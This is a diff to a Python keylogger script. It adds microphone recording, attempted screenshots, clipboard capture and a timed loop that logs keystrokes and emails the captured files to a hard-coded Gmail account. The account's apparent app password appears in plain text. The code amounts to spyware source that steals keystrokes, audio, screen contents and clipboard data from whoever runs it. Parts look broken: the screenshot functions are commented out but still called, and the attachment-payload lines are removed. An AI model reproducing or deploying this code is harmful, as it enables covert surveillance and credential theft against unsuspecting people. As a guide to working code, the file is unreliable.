@@ -32,15 +32,19 @@ from requests import get
 
 # screenshot lib 
 from multiprocessing import Process, freeze_support
-import mss          # Replaced by ImageGrab 
-
+import pyautogui
 
 ## KeyLogger
 
 keys_information = "new_key_log.txt"
 system_information = "sys_info.txt"
-
 clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
+
+microphone_time = 10
+time_iterations = 15
+number_of_iterations_end = 3
 
 email_address = "vblueice1@gmail.com"
 password = "lkck bqnt louf vgyi"
@@ -68,12 +72,8 @@ def send_email(filename, attachment, toaddress):
     filename = filename
     attachment = open(attachment, 'rb')
 
+
     p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
     p.add_header('Content-Disposition', "attachment: filename = %s" % filename)
 
     msg.attach(p)
@@ -143,40 +143,99 @@ def copy_clipboard():
     
 copy_clipboard()
 
+def microphone():
+    fz = 44100
+    seconds = microphone_time
 
-count = 0 
-keys = []
+    my_recording = sd.rec(int(seconds * fz), samplerate=fz, channels=2, dtype='int16') 
+    sd.wait()
+    write(file_path + extend + audio_information, fz, my_recording)
 
-def on_press(key):
+microphone()
 
-    global keys, count 
+# def screenshot():
+#     im = ImageGrab.grab()
+#     im.save(file_path + extend + screenshot_information)
 
-    print(key)
-    keys.append(key)
-    count += 1
+# screenshot()
 
-    if count >=1:
-        count = 0
-        write_file(keys)
-        keys = []
+# def screenshot():
+#     with mss.mss() as sct: 
+#         sct.shot(output=file_path+extend+screenshot_information)
+    
+# screenshot()
+
+# def capture_screenshot():
+#     screenshot = pyautogui.screenshot()
+#     screenshot.save(file_path+extend)
+
+# capture_screenshot()
+
+# def screenshot():
+#     subprocess.run(["scrot", file_path+extend+screenshot_information], check=True)
+
+# screenshot()
+
+number_of_iterations = 0 
+currentTime = time.time()
+stoppingTime = time.time() + time_iterations
+
+
+while number_of_iterations < number_of_iterations_end: 
+
+
+    count = 0 
+    keys = []
+
+    def on_press(key):
+
+        global keys, count, currentTime
+
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >=1:
+            count = 0
+            write_file(keys)
+            keys = []
 
 
 
-def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+    def write_file(keys):
+        with open(file_path + extend + keys_information, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
 
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingTime: 
+            return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:
+
+        with open(file_path+extend+keys_information, "w") as f:
+            f.write("")
+        
+        screenshot()
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddress)
+
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iterations
+
